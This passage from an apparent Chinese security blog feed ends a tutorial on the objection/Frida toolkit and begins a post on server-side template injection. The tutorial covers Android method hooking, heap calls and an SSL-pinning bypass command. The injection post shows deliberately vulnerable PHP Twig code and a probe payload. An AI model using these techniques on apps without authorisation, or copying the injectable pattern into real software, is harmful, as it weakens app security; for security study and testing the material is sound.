class="line">android.util.DisplayMetrics</span><br><span class="line">android.view.Choreographer$FrameDisplayEventReceiver</span><br><span class="line">android.view.Display</span><br><span class="line">android.view.Display$ColorTransform</span><br><span class="line">android.view.Display$ColorTransform$1</span><br><span class="line">android.view.Display$Mode</span><br><span class="line">android.view.Display$Mode$1</span><br><span class="line">android.view.DisplayAdjustments</span><br><span class="line">android.view.DisplayEventReceiver</span><br><span class="line">android.view.DisplayInfo</span><br><span class="line">android.view.DisplayInfo$1</span><br><span class="line">android.view.DisplayListCanvas</span><br><span class="line">android.view.SurfaceControl$PhysicalDisplayInfo</span><br><span class="line">com.android.settings.DisplaySettings</span><br><span class="line">com.android.settings.wfd.WifiDisplaySettings</span><br><span class="line">com.google.android.gles_jni.EGLDisplayImpl</span><br><span class="line">javax.microedition.khronos.egl.EGLDisplay</span><br><span class="line"></span><br><span class="line">Found 40 classes</span><br></pre></td></tr></table></figure><h3 id="内存中搜索所有包含关键词key的方法"><a href="#内存中搜索所有包含关键词key的方法" class="headerlink" title="内存中搜索所有包含关键词key的方法"></a>内存中搜索所有包含关键词key的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking search methods &lt;keys&gt;</span><br><span class="line">eg:android hooking search methods dispaly</span><br></pre></td></tr></table></figure><h3 id="列出类的所有方法"><a href="#列出类的所有方法" class="headerlink" title="列出类的所有方法"></a>列出类的所有方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list class_methods</span><br><span class="line">android hooking list class_methods &lt;class&gt;</span><br><span class="line">android hooking list class_methods android.hardware disapaly.DisplayManager</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的activity"><a href="#列出进程中所有的activity" class="headerlink" title="列出进程中所有的activity"></a>列出进程中所有的activity</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的service"><a href="#列出进程中所有的service" class="headerlink" title="列出进程中所有的service"></a>列出进程中所有的service</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hook list services</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的广播接收器"><a href="#列出进程中所有的广播接收器" class="headerlink" title="列出进程中所有的广播接收器"></a>列出进程中所有的广播接收器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list receivers</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的内容提供者"><a href="#列出进程中所有的内容提供者" class="headerlink" title="列出进程中所有的内容提供者"></a>列出进程中所有的内容提供者</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list providers</span><br></pre></td></tr></table></figure><h3 id="对指定的方法进行hook"><a href="#对指定的方法进行hook" class="headerlink" title="对指定的方法进行hook"></a>对指定的方法进行hook</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method &lt;method_Name&gt;</span><br><span class="line">android hooking watch class java.io.File</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  -----------------------------</span><br><span class="line">nenk6ks64jg     64  watch-class for: java.io.File</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</span><br><span class="line">--dump-args                               &#x2F;&#x2F;打印函数的参数</span><br><span class="line">--dump-backtrace                          &#x2F;&#x2F;调用栈</span><br><span class="line">--dump-return                             &#x2F;&#x2F;返回值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class java.io.File and method $init.</span><br><span class="line">(agent) Hooking java.io.File.$init(java.io.File, java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.lang.String, java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.net.URI)</span><br><span class="line">(agent) Registering job 5tk3e403t35. Type: watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><blockquote><p>虽然只确定了Hook构造，但是默认会Hook对应方法的所有重载。同时，在输出的最后一行显示<strong>Registering job 5tk3e403t35</strong>，表示这个Hook被作为一个任务被添加。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><p>在“设置”应用中的任意位置进行点击时，会发现java.ioFile.File(java.io.lang.String)这一个函数被调用了。在Backtrace之后打印的调用栈中，我们可以清楚的看到这个构造函数的调用来源</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(agent) [5tk3e403t35] Called java.io.File.File(java.lang.String)</span><br><span class="line">(agent) [5tk3e403t35] Backtrace:</span><br><span class="line">java.io.File.&lt;init&gt;(Native Method)</span><br><span class="line">android.content.res.XResources.isFirstLoad(XResources.java:115)</span><br><span class="line">de.robv.android.xposed.XposedInit.cloneToXResources(XposedInit.java:396)</span><br><span class="line">de.robv.android.xposed.XposedInit.access$100(XposedInit.java:63)</span><br><span class="line">de.robv.android.xposed.XposedInit$9.afterHookedMethod(XposedInit.java:326)</span><br><span class="line">de.robv.android.xposed.XposedBridge.handleHookedMethod(XposedBridge.java:374)</span><br><span class="line">android.app.ResourcesManager.getTopLevelResources(&lt;Xposed&gt;)</span><br><span class="line">android.app.ActivityThread.getTopLevelResources(ActivityThread.java:1701)</span><br><span class="line">android.app.ApplicationPackageManager.getResourcesForApplication(ApplicationPackageManager.java:1032)</span><br><span class="line">de.robv.android.xposed.XposedBridge.invokeOriginalMethodNative(Native Method)</span><br><span class="line">de.robv.android.xposed.XposedBridge.handleHookedMethod(XposedBridge.java:360)</span><br><span class="line">android.app.ApplicationPackageManager.getResourcesForApplication(&lt;Xposed&gt;)</span><br><span class="line">android.app.ApplicationPackageManager.getText(ApplicationPackageManager.java:1286)</span><br><span class="line">android.content.pm.ComponentInfo.loadLabel(ComponentInfo.java:85)</span><br><span class="line">com.android.settings.DreamBackend.getActiveDreamName(DreamBackend.java:136)</span><br><span class="line">com.android.settings.DreamSettings.getSummaryTextWithDreamName(DreamSettings.java:261)</span><br><span class="line">com.android.settings.DisplaySettings.updateScreenSaverSummary(DisplaySettings.java:425)</span><br><span class="line">com.android.settings.DisplaySettings.updateState(DisplaySettings.java:381)</span><br><span class="line">com.android.settings.DisplaySettings.onResume(DisplaySettings.java:362)</span><br><span class="line">android.app.Fragment.performResume(Fragment.java:2263)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1008)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1148)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1130)</span><br><span class="line">android.app.FragmentManagerImpl.dispatchResume(FragmentManager.java:1963)</span><br><span class="line">android.app.FragmentController.dispatchResume(FragmentController.java:174)</span><br><span class="line">android.app.Activity.performResume(Activity.java:6348)</span><br><span class="line">android.app.ActivityThread.performResumeActivity(ActivityThread.java:3092)</span><br><span class="line">android.app.ActivityThread.handleResumeActivity(ActivityThread.java:3134)</span><br><span class="line">android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2481)</span><br><span class="line">android.app.ActivityThread.-wrap11(ActivityThread.java)</span><br><span class="line">android.app.ActivityThread$H.handleMessage(ActivityThread.java:1344)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:102)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5417)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)</span><br><span class="line">de.robv.android.xposed.XposedBridge.main(XposedBridge.java:107)</span><br><span class="line"></span><br><span class="line">(agent) [5tk3e403t35] Arguments java.io.File.File(&#x2F;data&#x2F;app&#x2F;com.google.android.deskclock-1&#x2F;base.apk)</span><br><span class="line">(agent) [5tk3e403t35] Return Value: (none)</span><br></pre></td></tr></table></figure><p>测试结束后，可以根据作业的ID来删除作业，取消对这些函数的Hook，最终执行结果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs kill 5tk3e403t35</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID  Hooks  Type</span><br><span class="line">------  -----  ----</span><br></pre></td></tr></table></figure><h3 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap search instances &lt;classname&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap search instances java.io.File</span><br><span class="line">Class instance enumeration complete for java.io.File</span><br><span class="line">Handle    Class         toString()</span><br><span class="line">--------  ------------  ---------------------------------------------------------------------------------------</span><br><span class="line">0x200d26  java.io.File  &#x2F;data&#x2F;app&#x2F;com.google.android.gms-1&#x2F;base.apk</span><br><span class="line">0x200d2a  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs</span><br><span class="line">0x200d2e  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml</span><br><span class="line">0x200d32  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml.bak</span><br><span class="line">0x100d36  java.io.File  &#x2F;data&#x2F;app&#x2F;com.google.android.deskclock-1&#x2F;base.apk</span><br><span class="line">0x100d3a  java.io.File  &#x2F;data&#x2F;misc&#x2F;keychain&#x2F;cacerts-added</span><br><span class="line">0x100d3e  java.io.File  &#x2F;data&#x2F;misc&#x2F;keychain&#x2F;cacerts-removed</span><br><span class="line">0x100d42  java.io.File  &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts</span><br><span class="line">0x100d46  java.io.File  &#x2F;data</span><br><span class="line">0x100d4a  java.io.File  &#x2F;data</span><br><span class="line">0x100d4e  java.io.File  &#x2F;system</span><br><span class="line">0x100d52  java.io.File  &#x2F;storage</span><br><span class="line">0x100d56  java.io.File  &#x2F;oem</span><br><span class="line">0x100d5a  java.io.File  &#x2F;vendor</span><br><span class="line">0x100d5e  java.io.File  &#x2F;cache</span><br><span class="line">0x100d62  java.io.File  &#x2F;data&#x2F;secure</span><br><span class="line">0x100d66  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d6a  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d6e  java.io.File</span><br><span class="line">0x100d72  java.io.File  &#x2F;data&#x2F;app&#x2F;mobi.acpm.inspeckage-1&#x2F;base.apk</span><br><span class="line">0x100d76  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d7a  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d7e  java.io.File</span><br><span class="line">0x100d82  java.io.File</span><br><span class="line">0x100d86  java.io.File  &#x2F;data&#x2F;data&#x2F;mobi.acpm.sslunpinning&#x2F;shared_prefs&#x2F;UnpinningPrefs.xml</span><br><span class="line">0x100d8a  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d8e  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d92  java.io.File</span><br><span class="line">0x100d96  java.io.File  &#x2F;data&#x2F;app&#x2F;mobi.acpm.sslunpinning-1&#x2F;base.apk</span><br><span class="line">0x100d9a  java.io.File  &#x2F;data&#x2F;data&#x2F;mobi.acpm.inspeckage&#x2F;shared_prefs&#x2F;InspeckagePrefs.xml</span><br><span class="line">0x100d9e  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100da2  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100da6  java.io.File</span><br><span class="line">0x100daa  java.io.File  &#x2F;data&#x2F;app&#x2F;just.trust.me-1&#x2F;base.apk</span><br><span class="line">0x100dae  java.io.File  &#x2F;data&#x2F;dalvik-cache</span><br><span class="line">0x100db2  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100db6  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100dba  java.io.File</span><br><span class="line">0x100dbe  java.io.File  &#x2F;system&#x2F;framework&#x2F;XposedBridge.jar</span><br><span class="line">0x100dc2  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0</span><br><span class="line">0x100dc6  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-added</span><br><span class="line">0x100dca  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-removed</span><br><span class="line">0x100dce  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;home_prefs.xml.bak</span><br><span class="line">0x100dd2  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;home_prefs.xml</span><br><span class="line">0x100dd6  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;development.xml.bak</span><br><span class="line">0x100dda  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;development.xml</span><br><span class="line">0x100dde  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;files</span><br><span class="line">0x100de2  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs</span><br><span class="line">0x100de6  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;cache</span><br><span class="line">0x100dea  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;databases</span><br><span class="line">0x100dee  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings</span><br><span class="line">0x100df2  java.io.File  &#x2F;</span><br><span class="line">0x100df6  java.io.File  &#x2F;data&#x2F;data&#x2F;com.android.settings&#x2F;cache</span><br><span class="line">0x100dfa  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100dfe  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100e02  java.io.File  lib&#x2F;arm64-v8a</span><br><span class="line">0x100e06  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk</span><br><span class="line">0x100e0a  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;lib&#x2F;arm64</span><br><span class="line">0x100e0e  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk!&#x2F;lib&#x2F;arm64-v8a</span><br><span class="line">0x100e12  java.io.File</span><br><span class="line">0x100e16  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk</span><br></pre></td></tr></table></figure><h3 id="调用实例方法"><a href="#调用实例方法" class="headerlink" title="调用实例方法"></a>调用实例方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap execute &lt;Handle&gt; &lt;methodname&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap execute 0x200d2e getPath</span><br><span class="line">Handle 0x200d2e is to class java.io.File</span><br><span class="line">Executing method: getPath()</span><br><span class="line">&#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml</span><br></pre></td></tr></table></figure><p>使用execute执行带参数时会报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap execute 0x200d2e setExecutable True</span><br><span class="line">Handle 0x200d2e is to class java.io.File</span><br><span class="line">Executing method: setExecutable()</span><br><span class="line">A Frida agent exception has occurred.</span><br><span class="line">Error: setExecutable(): argument count of 0 does not match any of:</span><br><span class="line">.overload(&#39;boolean&#39;)</span><br><span class="line">.overload(&#39;boolean&#39;, &#39;boolean&#39;)</span><br><span class="line">    at throwOverloadError (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:1020)</span><br><span class="line">    at n (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:667)</span><br><span class="line">    at &#x2F;script1.js:9147</span><br><span class="line">    at &#x2F;script1.js:9435</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:11</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:279</span><br><span class="line">    at &#x2F;script1.js:9439</span><br><span class="line">    at &#x2F;script1.js:3011</span><br><span class="line">    at &#x2F;script1.js:9440</span><br></pre></td></tr></table></figure><h3 id="执行带参数函数"><a href="#执行带参数函数" class="headerlink" title="执行带参数函数"></a>执行带参数函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap evaluate &lt;Handle&gt;</span><br></pre></td></tr></table></figure><blockquote><p>执行之后会进入一个迷你的编辑器环境，之后输入我们想要执行的脚本内容，编辑完成后按回车键，即会开始执行这行脚本并输出结果。我们来使用File类的canWrite()函数和setWrite()函数进行测试，具体内容如下</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; ,clazz.canWrite())</span><br><span class="line">clazz.setWritable(false)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; , clazz.canWrite())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap evaluate 0x200d2e</span><br><span class="line">(The handle at &#96;0x200d2e&#96; will be available as the &#96;clazz&#96; variable.)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; ,clazz.canWrite())</span><br><span class="line">clazz.setWritable(false)</span><br><span class="line">console.log(&#39;File is canWrite? &#x3D;&gt;&#39; , clazz.canWrite())</span><br><span class="line">JavaScript capture complete. Evaluating...</span><br><span class="line">Handle 0x200d2e is to class java.io.File</span><br><span class="line">File is canWrite? &#x3D;&gt; true</span><br><span class="line">File is canWrite? &#x3D;&gt; false</span><br></pre></td></tr></table></figure><h3 id="查看内存中的so库"><a href="#查看内存中的so库" class="headerlink" title="查看内存中的so库"></a>查看内存中的so库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list modules</span><br></pre></td></tr></table></figure><p>查看so库的导出(export)函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list exports libssl.so</span><br></pre></td></tr></table></figure><p>将结果保存到json文件中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory list exports libart.so --json &#x2F;root&#x2F;libart.json</span><br></pre></td></tr></table></figure><h3 id="关闭SSLPINNING"><a href="#关闭SSLPINNING" class="headerlink" title="关闭SSLPINNING"></a>关闭SSLPINNING</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure><h2 id="objection远程连接"><a href="#objection远程连接" class="headerlink" title="objection远程连接"></a>objection远程连接</h2><p>frida 启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><p>objection远程链接</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection -N -h 192.168.31.52 -p 8888 -g com.xxx.xxx explore</span><br></pre></td></tr></table></figure><h2 id="Obejction-Wallbreaker插件"><a href="#Obejction-Wallbreaker插件" class="headerlink" title="Obejction Wallbreaker插件"></a>Obejction Wallbreaker插件</h2><h3 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hluwa&#x2F;Wallbreaker ~&#x2F;.objection&#x2F;plugins&#x2F;Wallbreaker</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objection: objection -g com.app.name explore -P ~&#x2F;.objection&#x2F;plugins</span><br></pre></td></tr></table></figure><h3 id="搜索类"><a href="#搜索类" class="headerlink" title="搜索类"></a>搜索类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker classsearch &lt;pattern&gt;</span><br><span class="line">&#x2F;&#x2F;根据给的 pattern 对所有类名进行匹配，列出匹配到的所有类名。</span><br></pre></td></tr></table></figure><h3 id="搜索对象"><a href="#搜索对象" class="headerlink" title="搜索对象"></a>搜索对象</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker objectsearch &lt;classname&gt;</span><br><span class="line">&#x2F;&#x2F;根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果。</span><br></pre></td></tr></table></figure><h3 id="Classdump"><a href="#Classdump" class="headerlink" title="Classdump"></a>Classdump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker classdump &lt;classname&gt; [--fullname]</span><br><span class="line">输出类的结构， 若加了 --fullname 参数，打印的数据中类名会带着完整的包名。</span><br></pre></td></tr></table></figure><h3 id="ObjectDump"><a href="#ObjectDump" class="headerlink" title="ObjectDump"></a>ObjectDump</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin wallbreaker objectdump &lt;handle&gt; [--fullname]</span><br><span class="line">在 ClassDump 的基础上，输出指定对象中的每个字段的数据。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;objection是一个基于Frida的动态的移动测试工具包，可以帮助我们来进行应用程序安全评估。&lt;/p&gt;
&lt;p&gt;主要由以下三个组件组成&lt;/p&gt;
&lt;p&gt;1.Frida-Gadget，以嵌入式模式运行应用，通过objection自己的api方法去调用frda执行我们想要的命令&lt;/p&gt;
&lt;p&gt;2.objeciton本身是由python编写的可以通过python实现一个交互式shell进行命令的加载和使用，以此来调用objection&lt;/p&gt;
&lt;p&gt;3.objection进行hook时会通过TypeScript独立生成一个agent.js文件，这样可以在使用中可以去直接调用所有的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png&quot; alt=&quot;objection.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="objection" scheme="http://www.ol4three.com/tags/objection/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模版注入学习</title>
    <link href="http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-01-12T08:36:19.000Z</published>
    <updated>2022-02-22T07:16:10.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模版引擎"><a href="#模版引擎" class="headerlink" title="模版引擎"></a>模版引擎</h1><p>模版引擎（这里特指用于Web开发的模版引擎）是为了使用户界面与业务数据(内容)分离而产生的，他可以生成特定格式的文档，利用模版引擎来生成前端的html代码，模版引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模版+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p><p>模版引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h1 id="SSTI-模版注入"><a href="#SSTI-模版注入" class="headerlink" title="SSTI(模版注入)"></a>SSTI(模版注入)</h1><p>SSTI就是服务器端模版注入（Server-Side Template Injection）</p><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给Vier视图层，经过模版渲染展示给 用户。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未进过任何处理就将其作为Web应用模版的一部分，模版引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模版的语句，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>凡是使用模版的地方都可能会出现SSTI的问题，SSTI不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模版引擎发现了很大的安全漏洞，然后模版引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模块引擎。</p><h2 id="附表"><a href="#附表" class="headerlink" title="附表"></a>附表</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220120174838082.png" alt="image-20220120174838082"></p><a id="more"></a><h1 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h1><p>php常见的模版：twig，smarty，blade</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>Twig是来自于Symfony的模版引擎，他非常易于安装和使用。它的操作有点像Mustache和liquid</p><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;\twig\lib\Twig\Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig &#x3D; new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output &#x3D; $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; &#x3D;&gt; $_GET[&quot;name&quot;]));  &#x2F;&#x2F; 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p><p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p><p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p><p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125190409616.png" alt="image-20220125190409616"></p><p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig&#x3D;newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output&#x3D;$twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);&#x2F;&#x2F; 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191148696.png" alt="image-20220125191148696"></p><p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p><p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p><p>例如这里用户输入name=20 ，则在服务端拼接的模版内容为:</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220125191252096.png" alt="image-20220125191252096"></p><p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>实际服务端要进行编译的模板就被构造为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure><p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello 